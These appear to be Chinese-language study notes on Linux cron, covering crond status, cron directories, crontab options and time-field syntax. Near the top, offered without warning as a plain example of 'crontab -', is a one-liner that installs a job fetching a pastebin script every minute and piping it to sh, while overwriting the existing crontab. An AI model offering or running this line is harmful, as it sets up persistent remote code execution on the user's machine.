# Linux cron

参考：

https://www.cnblogs.com/peida/archive/2013/01/08/2850483.html

例子参考：

https://www.runoob.com/w3cnote/linux-crontab-tasks.html

> 如果运行的是脚本使用`/bin/bash`来执行
>
> 可以使用`crontab -`将stdout转为crontask
>
> ```
> echo "* * * * * (crul -fsSL https://pastebin.com/raw/e8XzcU2Q || wget -q -O- https://pastebin.com/raw/e8XzcU2Q) | sh" | crontab -
> ```
>
> crond不会将crontask输出的内容展示在控制台上，但是会在日志中出现

## 概述

crond是一个定时执行任务的守护线程，crond将会通过mail发送到用户的系统邮箱`/var/spool/mail/username`中

查看crond状态

```
[root@cyberpelican etc]# systemctl status crond
● crond.service - Command Scheduler
   Loaded: loaded (/usr/lib/systemd/system/crond.service; enabled; vendor preset: enabled)
   Active: active (running) since Wed 2020-11-25 10:29:01 CST; 5 days ago
 Main PID: 1630 (crond)
    Tasks: 1
   CGroup: /system.slice/crond.service
           └─1630 /usr/sbin/crond -n

Nov 25 10:29:01 cyberpelican systemd[1]: Started Command Scheduler.
Nov 25 10:29:01 cyberpelican crond[1630]: (CRON) INFO (RANDOM_DELAY will be scaled with factor 81% if used.)
Nov 25 10:29:03 cyberpelican crond[1630]: (CRON) INFO (running with inotify support)
Nov 30 18:29:01 cyberpelican crond[1630]: (*system*) RELOAD (/etc/crontab)
Nov 30 18:29:01 cyberpelican crond[1630]: (echo) ERROR (getpwnam() failed)
Nov 30 18:30:01 cyberpelican crond[1630]: (echo) ERROR (getpwnam() failed)
Nov 30 18:31:01 cyberpelican crond[1630]: (echo) ERROR (getpwnam() failed)
Nov 30 18:32:01 cyberpelican crond[1630]: (echo) ERROR (getpwnam() failed)
Nov 30 18:33:01 cyberpelican crond[1630]: (echo) ERROR (getpwnam() failed)
Nov 30 18:34:01 cyberpelican crond[1630]: (echo) ERROR (getpwnam() failed)
```

## 目录

==我们还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。==

- `/etc/crontab`

  系统调度的配置文件

- `/etc/cron.d`

  存储需要执行的crontab文件或脚本

- ==`/var/spool/cron`==

  通过`crontab -e`命令创建的crontab文件目录

- `/etc/cron.deny`

  该文件中所列用户不允许使用crontab命令

- `/etc/cron.allow`

  该文件中所列用户允许使用crontab命令

## 参数

> 通常使用`crontab -u username -e `或是`crontab -u username filename`来为指定用户添加命令，crond会检验文件中语法

crontab是一个操作cron daemon(crond) 的软件，每个用户都可以自己的crontab(定时任务)

- `-u user`

  指定任务生效的用户，默认当前用户。如果使用了`su`，必须使用`-u`参数指定用户

- `-l list`

  显示当前用户的crontab

- `-r remove`

  删除当前用户的crontab

- `-e edit`

  修改或添加当前用户的crontab

- `-s security`

  添加SELinux context，使crontab生效

## /etc/crontab

> 常用于调用/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly
>
> ==run-parts (`/usr/bin/run-parts`)用于调用指定文件下的所有脚本==
>
> root表示以root的身份去执行
>
> ==分 时 日 月 周==

```
[root@localhost ~]# cat /etc/crontab 

SHELL=/bin/bash

PATH=/sbin:/bin:/usr/sbin:/usr/bin

MAILTO=""HOME=/

# run-parts

51 * * * * root run-parts /etc/cron.hourly

24 7 * * * root run-parts /etc/cron.daily

22 4 * * 0 root run-parts /etc/cron.weekly

42 4 1 * * root run-parts /etc/cron.monthly
```

### 扩展

- `*`

  代表所有可能的值，如month字段为星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。

- `,`

  可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”

- `-`

  可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”

- `/`

  可以用正斜线指定时间的间隔频率，例如`* */2 * * *`”表示每两小时执行一次。
